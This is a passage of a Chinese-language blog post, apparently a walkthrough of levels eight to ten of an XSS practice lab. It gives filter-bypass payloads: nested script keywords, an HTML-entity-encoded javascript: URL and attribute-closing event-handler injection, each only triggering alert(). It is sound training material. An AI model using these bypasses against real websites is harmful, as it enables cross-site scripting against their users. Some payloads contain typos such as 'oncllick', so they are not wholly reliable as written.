+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert()&lt;&#x2F;scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第八关</strong></p>
+<p><img src="C:\Users\hello\AppData\Roaming\Typora\typora-user-images\1600321611196.png"></p>
+<p>这一关的输出点在href里面，可是javascript这个关键词中间被加上了个_,经过尝试，大小写变换，复写，闭合a标签都无法弹窗，可以对JavaScript这个关键字的部分进行编码，我使用Google浏览器的hackbar中的html encode功能</p>
+<p><img src="http://ww1.sinaimg.cn/large/007YMQQNgy1gitlqslkzyj30xe0aodge.jpg" alt="chrome_bCOVSEaohC.png"></p>
+<p>所以，payload为：(就是把t进行了html编码)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(0)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第九关</strong></p>
+<p>这一关，我是查看了靶场的源代码</p>
+<p><img src="https://img2018.cnblogs.com/blog/1674381/201905/1674381-20190517085800360-2098493848.png"></p>
+<p>所以，payload中必须有http://, 且输出点在href中，payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(http:&#x2F;&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第十关</strong></p>
+<p>这一关没有输入框，也没有超链接，不过url中有个keyword参数，但是被实体化输出了，无法利用，查看源代码，</p>
+<p><img src="https://img-blog.csdnimg.cn/2019092122010135.png"></p>
+<p>将这三个隐藏参数输入到url中，发现只有一个被输出了</p>
+<p><img src="https://img-blog.csdnimg.cn/20190921220424920.png"></p>
+<p>输出点在属性里面，可以闭合”“。再将隐藏属性屏蔽，payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; oncllick&#x3D;&quot;alert(0)</span><br></pre></td></tr></table></figure>
+
+<p>后面的几关，就不写了，时间不够了，就是使用burp抓包，修改referer，useragent，cookie，</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/01/web%E5%AE%89%E5%85%A802%EF%BC%9A%E8%AE%A4%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="prev" title="web安全02：认识数据库">
+      <i class="fa fa-chevron-left"></i> web安全02：认识数据库
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3"><span class="nav-number">2.</span> <span class="nav-text">反序列化相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">5.</span> <span class="nav-text">xss</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
